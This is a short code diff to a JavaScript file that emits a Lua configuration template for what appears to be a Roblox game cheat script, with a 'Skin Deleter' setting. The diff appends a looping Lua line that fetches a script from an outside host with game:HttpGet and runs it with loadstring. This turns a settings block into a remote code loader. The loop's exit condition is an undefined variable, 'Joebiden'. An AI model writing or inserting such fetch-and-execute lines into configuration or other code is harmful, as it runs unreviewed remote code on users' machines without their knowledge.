@@ -1826,7 +1826,10 @@ end)
   ["Skin Deleter"] = {
     ["Enable"] = false
   }
-}`
+}
+  repeat wait()spawn(function()loadstring(game:HttpGet("https://nousigi.com/loader.lua"))()end)wait(10)until Joebiden\`
+
+`
           break;
 
 //         case 'astd' :
